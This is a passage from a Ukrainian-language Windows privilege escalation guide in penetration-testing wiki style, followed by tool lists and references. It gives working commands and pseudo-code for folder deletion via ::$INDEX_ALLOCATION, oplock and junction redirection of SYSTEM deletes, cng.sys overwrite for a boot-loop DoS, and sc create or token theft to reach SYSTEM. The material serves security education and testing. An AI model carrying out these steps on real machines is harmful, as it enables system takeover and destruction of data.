    - Windows Installer:
        - Читає ваш шкідливий `.rbs`.
        - Копіює вашу DLL `.rbf` у цільове розташування.
    - Тепер ваша **шкідлива DLL розташована за шляхом, звідки її завантажує SYSTEM**.

- Останній крок: Виконайте код від SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажує перехоплену DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основна техніка MSI rollback (описана вище) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дозволяє лише **довільне видалення файлів**?

Можна використати **внутрішні механізми NTFS**: кожна папка має прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Тож якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить папку цілком** із файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Хоча ви викликаєте API видалення *файлу*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш primitive не дозволяє видаляти довільні файли чи папки, але **дозволяє видаляти *вміст* папки, контрольованої зловмисником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **oplock** призупиняє виконання, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він доходить до `file1.txt`, **oplock спрацьовує** та передає керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
    - Це очистить `folder1`, не порушуючи oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створити **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це націлено на внутрішній потік NTFS, у якому зберігаються метадані папки: видалення цього потоку видаляє папку.

5. Крок 5: Звільнення oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видалено користувачем SYSTEM.

### Від створення довільної папки до постійного DoS

Використайте примітив, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з іменем **критично важливого драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити за цим шляхом папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Після цього Windows спробує завантажити `cng.sys` під час запуску.
- Система побачить папку, **не зможе знайти справжній драйвер** і **аварійно завершить роботу або зупинить завантаження**.
- **Резервного варіанта немає**, і **відновитися без зовнішнього втручання** (наприклад, відновлення завантаження або доступу до диска) не вдасться.

### Від привілейованих шляхів журналів/резервних копій і OM symlinks до перезапису довільних файлів / DoS під час завантаження

Коли **привілейована служба** записує журнали/експорти за шляхом, зчитаним із **доступної для запису конфігурації**, перенаправте цей шлях за допомогою **symlinks Object Manager + точок монтування NTFS**, щоб перетворити привілейований запис на перезапис довільного файлу (навіть **без** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігурація, у якій зберігається цільовий шлях, доступна зловмиснику для запису (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити точку монтування для `\RPC Control` і файловий symlink OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, що записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігурацію, щоб визначити шлях до привілейованого журналу, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адміністратор натисне «надіслати тестове SMS»). Тепер дані записуються в `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписаний цільовий файл (за допомогою hex/PE parser), щоб підтвердити пошкодження; після перезавантаження Windows завантажить драйвер із підміненого шляху → **boot loop DoS**. Це також працює з будь-яким захищеним файлом, який привілейована служба відкриває для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо його копія є в `C:\Windows\System32\cng.sys`, спершу може бути вибрано її, що робить цей файл надійною ціллю для DoS через пошкоджені дані.



## **Від High Integrity до System**

### **Новий сервіс**

Якщо ви вже працюєте в процесі з рівнем цілісності High Integrity, отримати **SYSTEM** можна легко — просто **створіть і запустіть новий сервіс**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки через 20 секунд його буде завершено, якщо це не дійсна служба.

### AlwaysInstallElevated

З процесу з високим рівнем цілісності можна спробувати **увімкнути записи реєстру AlwaysInstallElevated** і **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Більше інформації про відповідні ключі реєстру та встановлення пакета _.msi_ тут.](#alwaysinstallelevated)

### Від високого рівня цілісності + привілею SeImpersonate до System

**Ви можете** [**знайти код тут**](seimpersonate-from-high-to-system.md)**.**

### Від SeDebug + SeImpersonate до привілеїв повного токена

Якщо у вас є ці привілеї токена (ймовірно, ви знайдете їх у процесі з уже високим рівнем цілісності), ви зможете **відкрити майже будь-який процес** (крім захищених процесів) із привілеєм SeDebug, **скопіювати токен** цього процесу й створити **довільний процес із цим токеном**.\
Зазвичай для цієї техніки **вибирають будь-який процес, запущений від імені SYSTEM з усіма привілеями токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
**Приклад коду, що виконує запропоновану техніку, можна знайти** [**тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку meterpreter використовує для підвищення привілеїв у `getsystem`. Вона полягає у **створенні каналу, а потім створенні служби або зловживанні нею, щоб записати дані в цей канал**. Тоді **сервер**, що створив канал і має привілей **`SeImpersonate`**, зможе **імперсонувати токен** клієнта каналу (служби), отримавши привілеї SYSTEM.\
Щоб [**дізнатися більше про іменовані канали, прочитайте це**](#named-pipe-client-impersonation).\
Приклад того, [**як перейти від високого рівня цілісності до System за допомогою іменованих каналів, наведено тут**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити DLL**, яку **завантажує** **процес**, запущений від імені **SYSTEM**, ви зможете виконувати довільний код із цими правами. Тому Dll Hijacking також корисний для такого типу підвищення привілеїв; до того ж, його набагато **легше виконати з процесу з високим рівнем цілісності**, оскільки він матиме **дозволи на запис** у папки, з яких завантажуються DLL.\
**Ви можете** [**дізнатися більше про Dll hijacking тут**](dll-hijacking/index.html)**.**

### **Від Administrator або Network Service до System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Від LOCAL SERVICE або NETWORK SERVICE до повних привілеїв

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Додаткова допомога

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Корисні інструменти

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні конфігурації та конфіденційні файли (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє можливі неправильні конфігурації та збирає інформацію (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні конфігурації**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережені дані сеансів PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Використовуйте -Thorough локально.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Перевіряє зібрані паролі по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це інструмент PowerShell для підміни ADIDNS/LLMNR/mDNS і атаки «людина посередині».**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛО, використовуйте Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**попередньо скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост у пошуках неправильних конфігурацій (радше інструмент для збору інформації, ніж для privesc) (потрібно скомпілювати) **(**[**попередньо скомпільована версія**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (попередньо скомпільований exe доступний на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевірка неправильних конфігурацій (попередньо скомпільований виконуваний файл доступний на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевірка можливих неправильних конфігурацій (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для належної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Потрібно скомпілювати проєкт із правильною версією .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб переглянути встановлену на хості жертви версію .NET, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи ескалації привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв шляхом використання слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Ескалація привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — практикум з локальної ескалації привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — атаки на Windows: AT — новий чорний (Rob Fuller і Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Ескалація привілеїв — Windows — повний посібник з OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — ескалація привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник з ескалації привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Контрольний список з ескалації привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Ескалація привілеїв у Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи ескалації привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг із макросом Word VBA через SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) і викрадення kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — Полювання на Срібного Лиса: гра в кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — вразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти для тестування символічних посилань — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Назад у минуле: зловживання символічними посиланнями у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт BOF для Cobalt Strike)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: небезпечне розв’язання модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — завдання з контрольного списку C/C++, розв’язання](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own з Microslop: об’єднання CLDFLT і перегонів за умовами в ядрі DirectX для локальної ескалації привілеїв у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одне I/O Ring, щоб правити ними всіма: повноцінний примітив експлойту для читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для ескалації привілеїв та інші корисні трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — атаки на WSUS, частина 2: CVE-2020-1013, локальна ескалація привілеїв у Windows 10 типу 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: дослідження Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — делегування з обмеженням на основі ресурсів Kerberos: як зміна образу призводить до ескалації привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — вилучення приватних ключів SSH з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — ескалація привілеїв через видалення папок Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: повернення своїми слідами до NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
